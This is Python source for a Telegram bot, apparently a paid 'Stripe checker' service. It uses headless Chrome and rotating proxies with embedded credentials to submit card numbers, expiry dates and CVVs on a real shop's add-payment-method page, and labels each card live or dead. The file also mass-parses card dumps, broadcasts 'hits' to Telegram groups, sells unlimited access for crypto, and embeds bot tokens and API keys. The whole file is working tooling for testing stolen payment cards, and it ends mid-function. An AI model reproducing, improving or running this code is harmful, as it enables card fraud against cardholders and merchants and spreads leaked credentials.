import requests, re, random, string, time, threading, os, json
PROXIES = [
    "px051703.pointtoserver.com:10780:purevpn0s9889572:jx5q0xao",
    "px420602.pointtoserver.com:10780:purevpn0s13486779:f3wxccw3",
    "px180801.pointtoserver.com:10780:purevpn0s2495712:lwpjuxgr",
    "ca-mon.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "px150902.pointtoserver.com:10780:purevpn0s9889572:jx5q0xao",
    "px270401.pointtoserver.com:10780:purevpn0s13933117:&%Bl}H6HMXvJ",
    "px015601.pointtoserver.com:10780:purevpn0s13811607:Wb%lj!uEc5&a",
    "px014004.pointtoserver.com:10780:purevpn0s12948370:e0q5xodo",
    "us6.cactussstp.com:3129:hughmuir2:lisamarie11",
    "nl3.cactussstp.com:3129:hughmuir2:lisamarie11",
    "px022507.pointtoserver.com:10780:purevpn0s551451:9dpdlc2nfxgj",
    "px040805.pointtoserver.com:10780:purevpn0s551451:9dpdlc2nfxgj",
    "px121102.pointtoserver.com:10780:purevpn0s551451:9dpdlc2nfxgj",
    "px016104.pointtoserver.com:10780:purevpn0s551451:9dpdlc2nfxgj",
    "px180801.pointtoserver.com:10780:purevpn0s551451:9dpdlc2nfxgj",
    "px121001.pointtoserver.com:10780:purevpn0s551451:9dpdlc2nfxgj",
    "px241102.pointtoserver.com:10780:purevpn0s551451:9dpdlc2nfxgj",
    "px023005.pointtoserver.com:10780:reseller3270s320237:7Grp9Gki",
    "px051003.pointtoserver.com:10780:reseller3270s320237:7Grp9Gki",
    "px591801.pointtoserver.com:10780:reseller3270s320237:7Grp9Gki",
    "px040706.pointtoserver.com:10780:reseller3270s320237:7Grp9Gki",
    "px019603.pointtoserver.com:10780:reseller3270s320237:7Grp9Gki",
    "px520401.pointtoserver.com:10780:reseller3270s320237:7Grp9Gki",
    "34.43.46.91:80",
    "58.254.153.146:17981",
    "px023005.pointtoserver.com:10780:purevpn0s9889572:jx5q0xao",
    "px043006.pointtoserver.com:10780:purevpn0s9889572:jx5q0xao",
    "px410701.pointtoserver.com:10780:purevpn0s9889572:jx5q0xao",
    "px022507.pointtoserver.com:10780:purevpn0s9889572:jx5q0xao",
    "px040805.pointtoserver.com:10780:purevpn0s9889572:jx5q0xao",
    "px520401.pointtoserver.com:10780:purevpn0s9889572:jx5q0xao",
    "px013401.pointtoserver.com:10780:purevpn0s9889572:jx5q0xao",
    "px013403.pointtoserver.com:10780:purevpn0s9889572:jx5q0xao",
    "px400408.pointtoserver.com:10780:purevpn0s9889572:jx5q0xao",
    "px180801.pointtoserver.com:10780:purevpn0s9889572:jx5q0xao",
    "px270401.pointtoserver.com:10780:purevpn0s9889572:jx5q0xao",
    "194.54.83.21:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "91.240.67.13:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "206.189.139.234:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "45.148.5.4:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2"
]

import zipfile
import tempfile

def create_proxy_extension(proxy_str):
    parts = proxy_str.split(':')
    if len(parts) == 2:
        return None  # No auth needed
    
    host, port, user, password = parts[0], parts[1], parts[2], parts[3]
    
    manifest_json = '''{
        "version": "1.0.0",
        "manifest_version": 2,
        "name": "Chrome Proxy",
        "permissions": [
            "proxy",
            "tabs",
            "unlimitedStorage",
            "storage",
            "<all_urls>",
            "webRequest",
            "webRequestBlocking"
        ],
        "background": {
            "scripts": ["background.js"]
        },
        "minimum_chrome_version":"22.0.0"
    }'''
    
    background_js = f'''
    var config = {{
        mode: "fixed_servers",
        rules: {{
          singleProxy: {{
            scheme: "http",
            host: "{host}",
            port: parseInt({port})
          }},
          bypassList: ["localhost"]
        }}
      }};

    chrome.proxy.settings.set({{value: config, scope: "regular"}}, function() {{}});

    function callbackFn(details) {{
        return {{
            authCredentials: {{
                username: "{user}",
                password: "{password}"
            }}
        }};
    }}

    chrome.webRequest.onAuthRequired.addListener(
                callbackFn,
                {{urls: ["<all_urls>"]}},
                ['blocking']
    );
    '''
    
    fd, path = tempfile.mkstemp(suffix='.zip')
    os.close(fd)
    
    with zipfile.ZipFile(path, 'w') as zp:
        zp.writestr("manifest.json", manifest_json)
        zp.writestr("background.js", background_js)
        
    return path

from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

B  = "https://shop.nemaneide.com"
PK = "pk_live_51ROOSi03FG8Au2CBvmO4o6DP0qA0RZrRrfZOnaBDsGPJGmufqblXi5kMzp8RwDVwaKd8ggjdazNJV7X72tBgnoFs00BuEsszoz"
UA = "Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36"

# Telegram Notification Settings
TELEGRAM_BOT_TOKEN = "8697583315:AAEfUvq9QHlykMbtJMdC53tOwWzUJYI-iZw"  # Add your Bot Token here
TELEGRAM_CHAT_ID = "1780590372"    # Group or Channel ID for Stripe Hit Broadcasts
ADMIN_CHAT_ID = "@Thedevilhere69"  # Admin handle for Deposit Alerts

GROUP_CHAT_IDS = set()

def send_telegram_hit(card, response, time_taken=None, user_name="User"):
    if not TELEGRAM_BOT_TOKEN:
        return
    text = (
        "<b>🔥 Stripe Hit Detected! 🔥</b>\n"
        "<b>Group:</b> RAIZEL X NOVA ⚡\n\n"
        f"<b>Status:</b> ✅ APPROVED\n"
        f"<b>Response:</b> {response}\n"
    )
    if time_taken is not None:
        text += f"<b>Time:</b> {time_taken}s\n"
    text += f"<b>Checked By:</b> {user_name}\n"
    text += "\n<b>By:</b> @OctaCvv"
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    
    # Retrieve persistent group IDs from USER_DB
    persistent_groups = USER_DB.get("group_chat_ids", [])
    target_chats = set(list(persistent_groups) + list(GROUP_CHAT_IDS))
    if str(TELEGRAM_CHAT_ID).startswith("-"):
        target_chats.add(TELEGRAM_CHAT_ID)
        
    for cid in target_chats:
        if not cid:
            continue
        try:
            requests.post(url, json={"chat_id": cid, "text": text, "parse_mode": "HTML"}, timeout=10)
        except Exception:
            pass

rnd  = lambda k: ''.join(random.choices(string.hexdigits.lower(), k=k))
fn   = lambda h, k: (m := re.search(rf'name="{k}"\s+value="([^"]+)"', h, re.I)) and m.group(1)
jn   = lambda h, k: (m := re.search(rf'"{k}"\s*:\s*"([^"]+)"', h)) and m.group(1)
icon = lambda s: '✅' if s == 'APPROVED' else '❌' if s == 'DECLINED' else '⚠️'

def run(inp):
    print(f"\n[*] ----------------------------------------", flush=True)
    print(f"[*] Browser started checking card: {inp.strip()}", flush=True)
    p = inp.strip().split('|')
    if len(p) != 4:
        return "ERROR", "Invalid format"

    cc, mm, yy, cvv = p
    yy = yy[-2:] if len(yy) == 4 else yy
    
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--disable-software-rasterizer")
    chrome_options.add_argument("--disable-extensions")
    chrome_options.add_argument("--blink-settings=imagesEnabled=false")
    chrome_options.add_argument("--window-size=800,600")
    chrome_options.add_argument("--remote-debugging-port=0")
    chrome_options.binary_location = "/usr/bin/google-chrome"

    from selenium.webdriver.chrome.service import Service
    service = Service("/usr/bin/chromedriver")
    driver = webdriver.Chrome(service=service, options=chrome_options)
    driver.set_page_load_timeout(30)
    driver.set_script_timeout(15)
    try:
        driver.get(f"{B}/my-account/")
        
        # Registration
        email = f"user{''.join(random.choices(string.ascii_lowercase, k=6))}@gmail.com"
        email_field = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, "#reg_email"))
        )
        email_field.send_keys(email)
        
        password_field = driver.find_element(By.CSS_SELECTOR, "#reg_password")
        password_field.send_keys("PassSecure123!@#")
        
        reg_btn = driver.find_element(By.CSS_SELECTOR, "button[name='register']")
        driver.execute_script("arguments[0].click();", reg_btn)
        time.sleep(3)
        
        # Navigate to payment methods page
        driver.get(f"{B}/my-account/add-payment-method/")
        time.sleep(4)
        
        # Wait for Stripe outer iframe
        stripe_iframe = None
        for _ in range(16):
            iframes = driver.find_elements(By.TAG_NAME, "iframe")
            for iframe in iframes:
                src = iframe.get_attribute("src") or ""
                if "elements-inner-payment" in src or "componentName=payment" in src:
                    stripe_iframe = iframe
                    break
            if stripe_iframe:
                break
            time.sleep(0.5)
                
        if not stripe_iframe:
            return "ERROR", "Stripe form not loaded"
            
        driver.switch_to.frame(stripe_iframe)
        time.sleep(1)
        
        # Inside iframe, fill card details
        card_num_input = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, "input[name='number']"))
        )
        card_num_input.send_keys(cc)
        
        exp_input = driver.find_element(By.CSS_SELECTOR, "input[name='expiry']")
        exp_input.send_keys(f"{mm}{yy}")
        
        cvc_input = driver.find_element(By.CSS_SELECTOR, "input[name='cvc']")
        cvc_input.send_keys(cvv)
        
        # Switch back to main page to click submit
        driver.switch_to.default_content()
        time.sleep(0.5)
        
        submit_btn = WebDriverWait(driver, 8).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, "#place_order"))
        )
        driver.execute_script("arguments[0].scrollIntoView(true);", submit_btn)
        time.sleep(0.3)
        driver.execute_script("arguments[0].click();", submit_btn)
        
        # Poll for result notice or URL change (up to 10 seconds)
        err_text = None
        for _ in range(20):
            time.sleep(0.5)
            try:
                error_el = driver.find_element(By.CSS_SELECTOR, "ul.woocommerce-error")
                if error_el and error_el.text.strip():
                    err_text = error_el.text.encode('ascii','ignore').decode()
                    break
            except Exception:
                pass
        if err_text:
            err_lower = err_text.lower()
            live_keywords = [
                'insufficient', 'balance', 'zip', 'postal code', 'postcode', 
                'requires action', 'authentication', 'otp', '3d', 'charged',
                'payment successful', 'order placed', 'thank you', 'success'
            ]
            is_live = any(kw in err_lower for kw in live_keywords)
            return ("APPROVED" if is_live else "DECLINED"), err_text

        if "payment-methods" in driver.current_url and "add-payment-method" not in driver.current_url:
            return "APPROVED", "Card added successfully"

        return "DECLINED", "Card check failed or timed out"
            
    except Exception as e:
        return "ERROR", str(e)
    finally:
        driver.quit()


JOBS = {}
VERIFIED_USERS = set()

# Required Channel and Group IDs for Access Control (e.g., -100123456789)
# If left empty, verification will bypass the Telegram API membership check and verify immediately.
REQUIRED_CHANNEL_ID = "-1003880948313"  # Put your channel chat ID here, e.g., "-1002234123456"
REQUIRED_GROUP_ID = "-1004341477521"    # Put your group chat ID here, e.g., "-1009876543210"


def is_subscribed(user_id):
    # Cache / memory bypass
    if user_id in VERIFIED_USERS:
        return True
        

    # If no IDs are specified, default to True (bypasses check)
    if not REQUIRED_CHANNEL_ID and not REQUIRED_GROUP_ID:
        return True
        
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getChatMember"
    
    if REQUIRED_CHANNEL_ID:
        try:
            r = requests.get(url, params={"chat_id": REQUIRED_CHANNEL_ID, "user_id": user_id}, timeout=5).json()
            if r.get("ok"):
                status = r["result"]["status"]
                if status not in ["member", "administrator", "creator"]:
                    return False
            else:
                print(f"Error checking channel membership: {r.get('description')}")
                return False
        except Exception as e:
            print(f"Connection error checking channel: {e}")
            return False
            
    if REQUIRED_GROUP_ID:
        try:
            r = requests.get(url, params={"chat_id": REQUIRED_GROUP_ID, "user_id": user_id}, timeout=5).json()
            if r.get("ok"):
                status = r["result"]["status"]
                if status not in ["member", "administrator", "creator"]:
                    return False
            else:
                print(f"Error checking group membership: {r.get('description')}")
                return False
        except Exception as e:
            print(f"Connection error checking group: {e}")
            return False
            
    # If checks passed, add to cache
    VERIFIED_USERS.add(user_id)
    return True


def get_file_content(file_id):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getFile?file_id={file_id}"
        r = requests.get(url, timeout=10).json()
        if r.get("ok"):
            file_path = r["result"]["file_path"]
            download_url = f"https://api.telegram.org/file/bot{TELEGRAM_BOT_TOKEN}/{file_path}"
            content = requests.get(download_url, timeout=20).content
            return content.decode('utf-8', errors='ignore')
    except Exception:
        pass
    return ""

def format_time(seconds):
    m, s = divmod(int(seconds), 60)
    h, m = divmod(m, 60)
    if h > 0:
        return f"{h}h {m}m {s}s"
    elif m > 0:
        return f"{m}m {s}s"
    else:
        return f"{s}s"

def build_status_text(checked_count, total_count, live_count, dead_count, error_count, elapsed_seconds, rem_credits=None):
    time_str = format_time(elapsed_seconds)
    cred_line = ""
    if rem_credits is not None:
        c_str = "∞ Unlimited" if str(rem_credits) in ["unlimited", "∞ Unlimited", "∞"] else f"{rem_credits}"
        cred_line = f"💳 <b>Credits Left</b> ➔ {c_str}\n"
    return (
        f"⚙️ <b>Gate</b> ➔ Stripe\n"
        f"⏳ <b>Progress</b> ➔ {checked_count}/{total_count}\n"
        f"{cred_line}"
        f"<b>Live</b> ➔ {live_count} 📑\n"
        f"<b>Dead</b> ➔ {dead_count} ❌\n"
        f"<b>Errors</b> ➔ {error_count} ⚠️\n"
        f"<b>Time</b> ➔ {time_str}\n\n"
        f"🔗 ➔ @OctaCvv 🌸\n"
        f"👑 ➔ @OctaCvv 🦈"
    )

def build_reply_markup(job_id, live_count, total_count, is_finished=False):
    keyboard = [
        [
            {"text": f"Live ({live_count})", "callback_data": f"live_{job_id}"},
            {"text": f"📑 All ({total_count})", "callback_data": f"all_{job_id}"}
        ]
    ]
    if not is_finished:
        keyboard.append([
            {"text": "🛑 Stop", "callback_data": f"stop_{job_id}"}
        ])
    return {"inline_keyboard": keyboard}

def build_restricted_markup():
    return {
        "inline_keyboard": [
            [{"text": "📢 Join Channel", "url": "https://t.me/+43CsLsUtAa9jOTJl"}],
            [{"text": "👥 Join Group", "url": "https://t.me/+bV_vbR8nM-RlOThl"}],
            [{"text": "✅ Verify", "callback_data": "verify_access"}]
        ]
    }

def build_welcome_markup():
    return {
        "inline_keyboard": [
            [
                {"text": "Checker", "callback_data": "btn_checker"},
                {"text": "Buy Now", "callback_data": "btn_buynow"}
            ],
            [
                {"text": "Updates ↗", "url": "https://t.me/+43CsLsUtAa9jOTJl"},
                {"text": "Referral", "callback_data": "btn_referral"}
            ],
            [
                {"text": "Support ↗", "url": "https://t.me/OctaCvv"}
            ]
        ]
    }

def get_welcome_text(first_name, user_id):
    u_data = get_user_data(user_id, first_name)
    access_type = u_data.get("access", "Trial")
    is_prem = u_data.get("is_premium") or access_type in ["Core", "Elite", "Root", "Premium", "VIP"]
    credits_val = "∞ Unlimited" if is_prem else str(u_data.get("credits", 150))
    joined_date = u_data.get("joined", time.strftime("%Y-%m-%d"))
    return (
        f"[❄️] <b>Welcome to RAIZEL X NOVA</b> ✅\n"
        f"___________________________________\n\n"
        f"<b>User</b> ➔ {first_name}\n"
        f"<b>User ID</b> ➔ <code>{user_id}</code>\n"
        f"<b>Access</b> ➔ {access_type}\n"
        f"<b>Credits</b> ➔ {credits_val}\n"
        f"<b>Joined</b> ➔ {joined_date}\n"
        f"___________________________________\n\n"
        f"Choose an option below.\n"
        f"___________________________________\n\n"
        f"👑 <b>Dev</b> ➔ @OctaCvv 🦈\n"
        f"<b>Version</b> ➔ v4.1"
    )

def send_telegram_msg(chat_id, txt, reply_markup=None):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": txt, "parse_mode": "HTML"}
    if reply_markup:
        payload["reply_markup"] = reply_markup
    try:
        return requests.post(url, json=payload, timeout=10).json()
    except Exception:
        return None

def edit_telegram_msg(chat_id, msg_id, txt, reply_markup=None):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/editMessageText"
    payload = {"chat_id": chat_id, "message_id": msg_id, "text": txt, "parse_mode": "HTML"}
    if reply_markup:
        payload["reply_markup"] = reply_markup
    try:
        requests.post(url, json=payload, timeout=10)
    except Exception:
        pass


USER_DB_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "users_db.json")

def load_user_db():
    if os.path.exists(USER_DB_FILE):
        try:
            with open(USER_DB_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    return {}

def save_user_db(db):
    try:
        with open(USER_DB_FILE, "w", encoding="utf-8") as f:
            json.dump(db, f, indent=2)
    except Exception:
        pass

USER_DB = load_user_db()

def get_user_data(user_id, first_name="User"):
    uid = str(user_id)
    if uid not in USER_DB:
        USER_DB[uid] = {
            "name": first_name,
            "credits": 150,
            "access": "Trial",
            "joined": time.strftime("%Y-%m-%d"),
            "is_premium": False,
            "expire_time": 0
        }
        save_user_db(USER_DB)
    return USER_DB[uid]

def deduct_credits(user_id, amount=5):
    uid = str(user_id)
    u_data = get_user_data(user_id)
    access_type = u_data.get("access", "Trial")
    if u_data.get("is_premium") or access_type in ["Core", "Elite", "Root", "Premium", "VIP"]:
        exp = u_data.get("expire_time", 0)
        if exp > 0 and time.time() > exp:
            u_data["is_premium"] = False
            u_data["access"] = "Trial"
            save_user_db(USER_DB)
        else:
            return True, u_data.get("credits", 150)
            
    current_credits = u_data.get("credits", 150)
    if current_credits >= amount:
        u_data["credits"] = current_credits - amount
        save_user_db(USER_DB)
        return True, u_data["credits"]
    else:
        return False, current_credits

def send_document(chat_id, filename, file_content, caption=""):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
    try:
        files = {'document': (filename, file_content.encode('utf-8'), 'text/plain')}
        data = {'chat_id': chat_id, 'caption': caption, 'parse_mode': 'HTML'}
        requests.post(url, data=data, files=files, timeout=20)
    except Exception:
        pass

def answer_callback(callback_query_id, text="", show_alert=False):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery"
    try:
        requests.post(url, json={"callback_query_id": callback_query_id, "text": text, "show_alert": show_alert}, timeout=5)
    except Exception:
        pass

BOT_USERNAME = None

def get_bot_username():
    global BOT_USERNAME
    if not BOT_USERNAME:
        try:
            r = requests.get(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getMe", timeout=5).json()
            if r.get("ok"):
                BOT_USERNAME = r["result"]["username"]
        except Exception:
            pass
    return BOT_USERNAME or "RAIZEL_X_NOVA_BOT"

def handle_callback_query(cb):
    cb_id = cb["id"]
    chat_id = cb["message"]["chat"]["id"]
    msg_id = cb["message"]["message_id"]
    from_user = cb.get("from", {})
    user_id = from_user.get("id", chat_id)
    first_name = from_user.get("first_name", "User")
    data = cb.get("data", "")
    
    if data == "verify_access" or data == "btn_back":
        if data == "verify_access" and not is_subscribed(user_id):
            answer_callback(cb_id, "❌ You must join both the channel and the group first!", show_alert=True)
            return
            
        if data == "verify_access":
            VERIFIED_USERS.add(user_id)
        answer_callback(cb_id, "Welcome!")
        welcome_text = get_welcome_text(first_name, user_id)
        edit_telegram_msg(chat_id, msg_id, welcome_text, build_welcome_markup())
        
        
    elif data == "btn_checker":
        answer_callback(cb_id, "Card Checker")
        checker_text = (
            "<b>💳 RAIZEL X NOVA Checker</b>\n\n"
            "• Single Check: Send <code>/st cc|mm|yy|cvv</code>\n"
            "• Mass Check: Send <code>/mst</code> with cards or upload a .txt file and reply /mst."
        )
        send_telegram_msg(chat_id, checker_text)
        
    elif data == "btn_buynow":
        answer_callback(cb_id, "Buy Premium")
        buynow_text = (
            "<b>Access</b> ➔ Core 🌸\n"
            "<b>Span</b> ➔ [7 Days]\n"
            "<b>Credits</b> ➔ ∞ Unlimited\n"
            "<b>Price</b> ➔ 5$\n"
            "___________________________________\n\n"
            "<b>Access</b> ➔ Elite 👾\n"
            "<b>Span</b> ➔ [15 Days]\n"
            "<b>Credits</b> ➔ ∞ Unlimited\n"
            "<b>Price</b> ➔ 10$\n"
            "___________________________________\n\n"
            "<b>Access</b> ➔ Root 👑\n"
            "<b>Span</b> ➔ [30 Days]\n"
            "<b>Credits</b> ➔ ∞ Unlimited\n"
            "<b>Price</b> ➔ 30$"
        )
        markup = {
            "inline_keyboard": [
                [{"text": "Pay Via", "callback_data": "btn_payvia"}],
                [{"text": "« Back", "callback_data": "btn_back"}]
            ]
        }
        edit_telegram_msg(chat_id, msg_id, buynow_text, markup)
        
    elif data == "btn_payvia":
        answer_callback(cb_id, "Select Plan")
        payvia_text = (
            "<b>Select Your Plan</b>\n\n"
            "Choose a plan to proceed with secure crypto payment"
        )
        markup = {
            "inline_keyboard": [
                [{"text": "Core $5", "callback_data": "plan_core"}],
                [{"text": "Elite $10", "callback_data": "plan_elite"}],
                [{"text": "Root $30", "callback_data": "plan_root"}],
                [{"text": "« Back", "callback_data": "btn_buynow"}]
            ]
        }
        edit_telegram_msg(chat_id, msg_id, payvia_text, markup)

    elif data in ["plan_core", "plan_elite", "plan_root"]:
        answer_callback(cb_id, "Select Payment Method")
        plans_info = {
            "plan_core": ("Core Plan", "$5", "7 Days"),
            "plan_elite": ("Elite Plan", "$10", "15 Days"),
            "plan_root": ("Root Plan", "$30", "30 Days")
        }
        ptitle, pprice, pduration = plans_info[data]
        plan_text = (
            f"<b>{ptitle}</b>\n"
            f"<b>Price</b> ➔ {pprice}\n"
            f"<b>Duration</b> ➔ {pduration}\n"
            f"<b>Credits</b> ➔ ∞\n"
            f"<b>Select Payment Method</b> ➔"
        )
        markup = {
            "inline_keyboard": [
                [
                    {"text": "BEP20", "callback_data": f"pay_bep20_{data}"}
                ],
                [
                    {"text": "LTC", "callback_data": f"pay_ltc_{data}"},
                    {"text": "BTC", "callback_data": f"pay_btc_{data}"}
                ],
                [{"text": "« Back", "callback_data": "btn_payvia"}]
            ]
        }
        edit_telegram_msg(chat_id, msg_id, plan_text, markup)

    elif data.startswith("pay_"):
        parts = data.split("_")
        method = parts[1].upper()
        
        if method in ["LTC", "BTC"]:
            answer_callback(cb_id, "⚠️ LTC & BTC payment gateways are under maintenance! Please use BEP20.", show_alert=True)
            return

        answer_callback(cb_id, "Payment Invoice Generated")
        plan_key = f"{parts[2]}_{parts[3]}"
        
        plan_details = {
            "plan_core": ("Core", "$5.00 USD", "5", "7 Days"),
            "plan_elite": ("Elite", "$10.00 USD", "10", "15 Days"),
            "plan_root": ("Root", "$30.00 USD", "30", "30 Days")
        }
        pname, pprice, pamt, pdur = plan_details.get(plan_key, ("Core", "$5.00 USD", "5", "7 Days"))
        
        network_name = "Binance Smart Chain (BEP20)"
        crypto_addr = "0x5ed6edb5f4abf7b658e746427d2f6610ebbf5afb"
        
        checkout_text = (
            f"<b>Plan</b> ➔ {pname}\n"
            f"<b>Price</b> ➔ {pprice}\n"
            f"<b>Pay</b> ➔ {pamt} USDT\n"
            f"<b>Network</b> ➔ {network_name}\n\n"
            f"<b>Address</b> ➔\n"
            f"<code>{crypto_addr}</code>\n\n"
            f"<b>Expires in</b> ➔ 30 min\n"
            f"<b>Deposits take 3 mins to confirm after completion</b>"
        )
        markup = {
            "inline_keyboard": [
                [{"text": "Paid", "callback_data": f"confirm_paid_{pname}"}],
                [{"text": "Support ↗", "url": "https://t.me/OctaCvv"}],
                [{"text": "« Back", "callback_data": plan_key}]
            ]
        }
        edit_telegram_msg(chat_id, msg_id, checkout_text, markup)

    elif data.startswith("confirm_paid_"):
        plan_name = data.replace("confirm_paid_", "")
        answer_callback(cb_id, "⌛ Payment submitted for verification!", show_alert=True)
        
        user_submitted_text = (
            f"<b>⌛ Payment Verification Submitted!</b>\n\n"
            f"<b>Plan Requested:</b> {plan_name}\n"
            f"<b>Status:</b> Under Review by Admin @OctaCvv\n\n"
            f"Your premium access will be activated immediately once Admin approves your transaction."
        )
        edit_telegram_msg(chat_id, msg_id, user_submitted_text, build_welcome_markup())
        
        # Send Alert to Admin DM (1780590372 and TELEGRAM_CHAT_ID)
        admin_alert_text = (
            f"🔔 <b>NEW DEPOSIT PAYMENT SUBMITTED!</b>\n\n"
            f"<b>User:</b> {first_name}\n"
            f"<b>User ID:</b> <code>{user_id}</code>\n"
            f"<b>Plan Requested:</b> {plan_name}\n"
            f"<b>Time:</b> {time.strftime('%H:%M:%S (%Y-%m-%d)')}\n\n"
            f"👇 <b>Click below to approve and grant premium access:</b>"
        )
        admin_markup = {
            "inline_keyboard": [
                [{"text": f"✅ Approve {plan_name}", "callback_data": f"adm_approve_{user_id}_{plan_name.lower()}"}],
                [{"text": "❌ Reject Payment", "callback_data": f"adm_reject_{user_id}"}]
            ]
        }
        # Send Alert ONLY to ADMIN_CHAT_ID (Admin DM or Private Admin Channel)
        send_telegram_msg(ADMIN_CHAT_ID, admin_alert_text, admin_markup)

    elif data.startswith("adm_approve_"):
        parts = data.split("_")
        target_uid = parts[2]
        plan_code = parts[3].lower()
        
        days = 7 if "core" in plan_code else (15 if "elite" in plan_code else 30)
        plan_title = "Core Plan" if "core" in plan_code else ("Elite Plan" if "elite" in plan_code else "Root Plan")
        
        target_user = get_user_data(target_uid)
        target_user["access"] = plan_title.split()[0]
        target_user["is_premium"] = True
        target_user["expire_time"] = time.time() + (days * 86400)
        save_user_db(USER_DB)
        
        answer_callback(cb_id, "✅ User Payment Approved!")
        edit_telegram_msg(chat_id, msg_id, f"✅ <b>Payment Approved & Premium Activated!</b>\n\nUser ID <code>{target_uid}</code> upgraded to <b>{plan_title} ({days} Days Unlimited)</b>.")
        
        # Send Notification to Target User
        user_notify = (
            f"🎉 <b>Payment Approved & Premium Activated!</b>\n\n"
            f"Your account has been upgraded to <b>{plan_title} ({days} Days Unlimited Access)</b> by Admin @OctaCvv!\n\n"
            f"Enjoy unlimited card checking!"
        )
        send_telegram_msg(target_uid, user_notify, build_welcome_markup())

    elif data.startswith("adm_reject_"):
        target_uid = data.replace("adm_reject_", "")
        answer_callback(cb_id, "❌ Payment Rejected!")
        edit_telegram_msg(chat_id, msg_id, f"❌ <b>Payment Rejected</b> for User ID <code>{target_uid}</code>.")
        
        # Send Notification to Target User
        user_notify = (
            f"❌ <b>Payment Verification Failed!</b>\n\n"
            f"Your deposit transaction could not be verified. Please contact <b>@OctaCvv</b> for assistance."
        )
        send_telegram_msg(target_uid, user_notify, build_welcome_markup())
        
    elif data == "btn_referral":
        answer_callback(cb_id, "Referral System")
        bot_uname = get_bot_username()
        ref_link = f"https://t.me/{bot_uname}?start=ref_{user_id}"
        referral_text = (
            f"[❄️] <b>Referral</b> ✅\n"
            f"___________________________________\n\n"
            f"<b>Your Link</b> ➔\n"
            f"<code>{ref_link}</code>\n\n"
            f"<b>Referrals</b> ➔ 0\n"
            f"<b>Progress</b> ➔ 0 / 5 (5 more for reward)\n"
            f"___________________________________\n\n"
            f"<b>How to earn free premium:</b>\n"
            f"1. Share your link above with friends\n"
            f"2. They open the bot via your link\n"
            f"3. They join the channel + group and click ✅ Verify\n"
            f"4. Every 5 verified joins = 1 days FREE premium\n"
            f"___________________________________\n\n"
            f"⚠️ <b>Note</b> ➔ Referral only works for new users\n"
            f"___________________________________\n\n"
            f"👑 <b>Dev</b> ➔ @OctaCvv 🦈"
        )
        markup = {
            "inline_keyboard": [
                [{"text": "📫 Share My Link ↗", "url": f"https://t.me/share/url?url={ref_link}&text=Check%20out%20RAIZEL%20X%20NOVA%20Stripe%20Checker!"}],
                [{"text": "« Back", "callback_data": "btn_back"}]
            ]
        }
        edit_telegram_msg(chat_id, msg_id, referral_text, markup)

    elif data.startswith("stop_"):
        job_id = data.replace("stop_", "")
        if job_id in JOBS:
            JOBS[job_id]["stop"] = True
            answer_callback(cb_id, "🛑 Stopping check process...")
        else:
            answer_callback(cb_id, "Check already completed or stopped.")
            
    elif data.startswith("live_"):
        job_id = data.replace("live_", "")
        if job_id in JOBS:
            job = JOBS[job_id]
            live_list = job["live_cards"]
            if not live_list:
                answer_callback(cb_id, "No Live cards found yet.")
            else:
                answer_callback(cb_id, "Sending Live cards file...")
                lines = [f"{card} → APPROVED ({msg})" for card, msg in live_list]
                content = "\n".join(lines)
                send_document(chat_id, f"Live_Cards_{len(live_list)}.txt", content, f"<b>✅ Live Cards ({len(live_list)})</b>")
        else:
            answer_callback(cb_id, "Job session expired.")
            
    elif data.startswith("all_"):
        job_id = data.replace("all_", "")
        if job_id in JOBS:
            job = JOBS[job_id]
            all_list = job["all_cards"]
            if not all_list:
                answer_callback(cb_id, "No cards checked yet.")
            else:
                answer_callback(cb_id, "Sending All cards file...")
                lines = [f"{card} → {st} ({msg})" for card, st, msg in all_list]
                content = "\n".join(lines)
                send_document(chat_id, f"All_Cards_{len(all_list)}.txt", content, f"<b>📑 All Checked Cards ({len(all_list)})</b>")
        else:
            answer_callback(cb_id, "Job session expired.")

def extract_cards(text):
    pattern = r'\b(\d{15,16})[|/:\-\s]+(\d{2})[|/:\-\s]+(\d{2,4})[|/:\-\s]+(\d{3,4})\b'
    matches = re.findall(pattern, text)
    cards = []
    for match in matches:
        cc, mm, yy, cvv = match
        yy = yy[-2:] if len(yy) == 4 else yy
        cards.append(f"{cc}|{mm}|{yy}|{cvv}")
    return cards

def handle_message(chat_id, text, extra_text="", from_user=None):
    user_id = from_user.get("id", chat_id) if from_user else chat_id
    first_name = from_user.get("first_name", "User") if from_user else "User"

    # Admin Commands
    ADMIN_IDS = [str(TELEGRAM_CHAT_ID), "1780590372"]
    if str(user_id) in ADMIN_IDS:
        if text.startswith("/grant"):
            parts = text.split()
            if len(parts) >= 3:
                target_uid = parts[1]
                plan_arg = parts[2].lower()
                
                days = 7 if plan_arg == "core" else (15 if plan_arg == "elite" else 30)
                plan_title = "Core Plan" if plan_arg == "core" else ("Elite Plan" if plan_arg == "elite" else "Root Plan")
                
